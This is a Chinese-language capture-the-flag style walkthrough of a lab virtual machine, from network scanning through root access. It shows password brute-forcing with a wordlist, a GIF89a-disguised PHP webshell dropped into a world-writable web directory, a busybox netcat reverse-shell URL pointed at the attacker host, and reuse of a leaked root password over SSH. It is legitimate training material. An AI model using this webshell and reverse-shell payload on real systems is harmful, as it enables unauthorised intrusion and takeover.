# 信息收集与初步探测

老规矩，新开一个靶机，先用 `arp-scan` 扫一下网段，看看新来的邻居是谁。

```bash
sudo arp-scan -l
```

```
Interface: eth0, type: EN10MB, MAC: 00:0c:29:1c:b5:a2, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:e0:22:04       VMware, Inc.
192.168.205.131 00:0c:29:c3:54:95       VMware, Inc.
192.168.205.191 08:00:27:06:30:73       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:e0:e2:35       VMware, Inc.

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.999 seconds (128.06 hosts/sec). 5 responded
```

很快就定位到了目标 IP `192.168.205.191`。下一步，直接上 Nmap 对它进行全端口扫描，看看开放了哪些服务。

```bash
nmap -p0-65535 192.168.205.191
```

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-28 07:23 -0400
Nmap scan report for 192.168.205.191
Host is up (0.00013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt
MAC Address: 08:00:27:06:30:73 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.98 seconds
```

结果出来了，开放了 22 (SSH)，80 (HTTP) 和 8000 (HTTP-alt)。有 Web 服务，这通常是最好的突破口。先从 80 端口开始看。

用 `curl` 简单请求一下 80 端口的首页。

```bash
curl 192.168.205.191
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
...
</head>
<body>
    <div class="container">
        <div class="quote">
            "The only way to do great work is to love what you do."
        </div>
        <div class="separator">-------------------------------------</div>
        <div class="signature">jiali</div>
    </div>
</body>
</html>
```

返回的是一个心灵鸡汤页面，但页面底部有个签名 `jiali`。这看起来很像一个用户名，先记下来。

接着用 `dirsearch` 扫一下目录，看看有没有什么隐藏的好东西。

```bash
dirsearch -q -u 192.168.205.191
```

```
[07:24:48] 200 -  621B  - http://192.168.205.191/login.php
...
```

`dirsearch` 跑出了一堆 403，但其中有一个 `login.php` 引起了我的注意。

# 初始突破

访问 `login.php` 是一个登录页面。我尝试了一些常见的弱口令组合和简单的 SQL 注入payload，都没反应。

再回头看 8000 端口，访问后发现是一个 Ajenti 控制面板，版本是 2.2.15。查了一下这个版本，没发现公开的 CVE，暂时没思路。

既然这样，就回到 80 端口的 `login.php`。我有了之前发现的用户名 `jiali`，现在缺的就是密码。这种场景，爆破是必须的。我打开 Burp Suite，用 `jiali` 作为用户名，加载了 `rockyou.txt` 字典的前 5000 行，对着登录请求开始爆破。

没过多久，就跑出了一个有效的凭证：`jiali:qweasdzxc`。

登录成功了。当80没有任何有用的攻击点，使用该密码富用于8000 Ajenti 成功进入。

# 权限提升

Ajenti 面板提供了一个 Web Terminal，这给了我一个 `jiali` 用户的 shell。我开始在系统里翻找敏感信息。在 `/var/www/` 目录下，我发现了名为 `...`文件。

```bash
$ ls -al
total 16
drwxr-xr-x  3 root     root     4096 Apr 19 09:49 .
drwxr-xr-x 12 root     root     4096 Apr  1  2025 ..
-rw-------  1 www-data www-data   26 Apr 19 09:49 ...
drwxr-xr-x  3 www-data www-data 4096 Apr 19 09:56 html
```

这个文件的所有者是 `www-data`，而我当前的 `jiali` 用户没有权限读取它。看来需要先拿到 `www-data` 权限。

我继续检查文件权限，发现在 `/var/www/html/` 目录下的 `jiali_home` 文件夹权限是 777，所有人可读可写可执行。

```bash
$ ls -al
total 20
drwxr-xr-x 3 www-data www-data 4096 Apr 19 09:56 .
drwxr-xr-x 3 root     root     4096 Apr 19 09:49 ..
-rwxrwxrwx 1 www-data www-data 1674 Apr 19 09:44 index.html
drwxrwxrwx 2 www-data www-data 4096 Apr 19 09:48 jiali_home
-rw-r--r-- 1 root     root     2732 Apr 19 09:56 login.php
```

这简直是白给。直接在这个目录里写入一个 PHP webshell，然后通过浏览器访问来执行命令，获取 `www-data` 的 shell。

准备一个简单的一句话木马 `cmd.php`。

```bash
$ cat cmd.php
GIF89a;
<?php 
if(isset($_GET['a']) && isset($_GET['b'])) {
    $a = $_GET['a'];
    $b = $_GET['b'];
    $a($b);
}
?>
<?php phpinfo(); ?>
```

把这个 `cmd.php` 文件放到了 `/var/www/html/jiali_home/` 目录下。

```bash
$ pwd
/var/www/html/jiali_home
```

先访问 `http://192.168.205.191/jiali_home/cmd.php`，页面成功显示了 `phpinfo()`，证明脚本可以执行。同时我也看了一下 `disable_functions`，发现 `exec` 函数还能用。

接下来，在我的 Kali 上开启 netcat 监听。

```bash
nc -lvnp 8888
```

然后构造 payload，通过 web shell 反弹一个 shell 回来。目标机器上有 `busybox`，用它来建立连接很方便。

```
http://192.168.205.191/jiali_home/cmd.php?a=exec&b=busybox%20nc%20192.168.205.128%208888%20-e%20/bin/bash
```

访问这个 URL 后，我的 nc 监听端成功接收到了反弹 shell。

```
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.191] 42042
```

现在我已经是 `www-data` 用户了，可以回头去读那个 `...` 文件了。

```bash
cat /var/www/...
```

```
root:hDLHiKiviqDf5CU55m8D
```

文件里是 root 用户的密码。

# 获取 Root 权限

拿到了 root 的密码，事情就简单了。直接用 SSH 登录。

```bash
ssh root@192.168.205.191
```

输入刚才拿到的密码 `hDLHiKiviqDf5CU55m8D`。

```
root@192.168.205.191's password: 
Linux Ace 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Apr 19 10:15:14 2026 from 192.168.3.94
root@Ace:~# id
uid=0(root) gid=0(root) groups=0(root)
```

成功登录，`id` 命令确认了 root 权限。靶机拿下。